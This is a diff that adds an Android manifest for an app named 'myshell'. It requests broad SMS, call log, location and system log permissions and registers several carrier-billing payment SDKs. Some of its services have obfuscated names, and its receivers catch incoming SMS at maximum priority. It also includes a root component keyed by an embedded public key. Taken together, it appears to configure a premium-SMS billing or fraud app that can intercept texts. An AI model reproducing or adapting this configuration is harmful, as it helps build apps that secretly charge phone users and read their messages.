@@ -1,0 +1,149 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.bb_sz.myshell">
+
+    <uses-permission android:name="android.permission.READ_SMS"/>
+    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+    <uses-permission android:name="android.permission.SEND_SMS"/>
+    <uses-permission android:name="android.permission.WRITE_SMS"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.GET_TASKS"/>
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+    <uses-permission android:name="com.android.launcher.permission.INSTALL_SHORTCUT"/>
+    <uses-permission android:name="com.sonyericsson.home.permission.BROADCAST_BADGE"/>
+    <uses-permission android:name="android.permission.VIBRATE"/>
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+
+    <uses-permission android:name="android.permission.MOUNT_UNMOUNT_FILESYSTEMS" />
+    <!-- 获取通话时长 -->
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+
+    <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.READ_LOGS"/>
+    <!-- ============================权限===================================== -->
+
+
+    <application
+        android:allowBackup="true"
+        android:icon="@mipmap/ic_launcher"
+        android:label="@string/app_name"
+        android:supportsRtl="true">
+        <activity
+            android:name=".MainActivity"
+            android:launchMode="singleInstance"
+            android:theme="@android:style/Theme.NoTitleBar.Fullscreen">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+        <activity android:name="com.bb_sz.device.DeviceInfoUI" >
+        </activity>
+
+        <!-- <meta-data android:name="SZ_SHELL_APP" android:value="com.bb_sz.ndk.App1" /> -->
+
+
+        <!-- JPAY SDK NEED start -->
+        <activity
+            android:name="com.jpay.main.DtActivity"
+            android:theme="@android:style/Theme.Light.NoTitleBar.Fullscreen" />
+
+        <receiver android:name="com.jpay.main.JPayReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.TIME_SET" />
+                <action android:name="android.intent.action.TIMEZONE_CHANGED" />
+                <action android:name="android.intent.action.LOCALE_CHANGED" />
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
+                <action android:name="android.net.wifi.WIFI_STATE_CHANGED" />
+                <action android:name="android.intent.action.USER_PRESENT" />
+            </intent-filter>
+            <intent-filter>
+                <action android:name="android.app.backup.CHECK_ACTION" />
+            </intent-filter>
+        </receiver>
+
+        <service android:name="com.jpay.main.JPayService">
+            <intent-filter android:priority="1000">
+                <action android:name="com.jpay.main.JPayService" />
+            </intent-filter>
+        </service>
+        <!--yingmei-->
+        <service android:name="f.g.h.j.ma.MService" >
+        </service>
+        <service android:name="c.a.d.s.LitSce" >
+        </service>
+
+        <receiver
+            android:name="f.g.h.j.ma.MCast"
+            android:label="NetworkConnection" >
+            <intent-filter>
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
+                <action android:name="android.intent.action.TIME_SET" />
+                <action android:name="android.intent.action.TIME_TICK" />
+                <action android:name="sss_takkk" />
+                <action android:name="sss_tuccc" />
+            </intent-filter>
+            <intent-filter android:priority="2147483647" >
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+            </intent-filter>
+        </receiver>
+        <!--weiyun-->
+        <service android:name="com.wyzf.service.InitService"></service>
+
+        <activity
+            android:name="com.jpay.sdk.JPayActivity"
+            android:configChanges="keyboardHidden|orientation"
+            android:screenOrientation="sensor"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar.Fullscreen" />
+        <activity
+            android:name="com.jpay.main.JPayActivity"
+            android:configChanges="keyboardHidden|orientation"
+            android:screenOrientation="sensor"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar.Fullscreen" />
+        <activity
+            android:name="com.jpay.main.JPayDActivity"
+            android:configChanges="keyboardHidden|orientation"
+            android:screenOrientation="sensor"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar.Fullscreen" />
+        <!-- JPAY SDK NEED end -->
+
+        <!--Bugly Need Strat-->
+        <meta-data android:name="BUGLY_APPID" android:value="{$BUGLYAPPID$}" />
+        <meta-data android:name="BUGLY_APP_CHANNEL" android:value="{$CID$}" />
+        <meta-data android:name="BUGLY_ENABLE_DEBUG" android:value="false" />
+        <!--Bugly Need End-->
+        <!--weiyun pay-->
+        <meta-data android:name="appCode" android:value="{$APP_CODE$}"/>
+        <meta-data android:name="packCode" android:value="{$CID$}"/>
+        <!--yingmei pay-->
+        <meta-data android:name="YM_CPID" android:value="{$YM_CPID$}" />
+        <!--mipay-->
+        <service android:name="com.android.mtools.MPService"></service>
+        <receiver android:name="com.android.mtools.MyReceiver">
+            <intent-filter android:priority="2147483647">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+                <action android:name="SEND_SMS_ACTION1" />
+                <action android:name="SEND_SMS_ACTION2" />
+                <action android:name="GET_SMS_ACTION" />
+                <action android:name="android.intent.action.USER_PRESENT" />
+            </intent-filter>
+        </receiver>
+
+        <!-- OS Root Start-->
+        <meta-data
+            android:name="lyrt_pubKey"
+            android:value="MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDM3LQ+lGfN9KEAIlRiotx2tnfDDUYa1QxvzN2ulekXPkYrEzuYzzamnVvHg9pr9WBS+dje+uqwYVdzfMhYosEZ7qKMHYEvmYhLm8Y4h3Lq0vyLT2M3BP8DIjJr86yC5ZwyBvx2+QenKxzhPKoaUqwiXAzLPOl175Q0ajWENOriQwIDAQAB" />
+        <meta-data
+            android:name="lyrt_from"
+            android:value="os_ms" />
+        <!-- OS Root End-->
+
+    </application>
+
+</manifest>
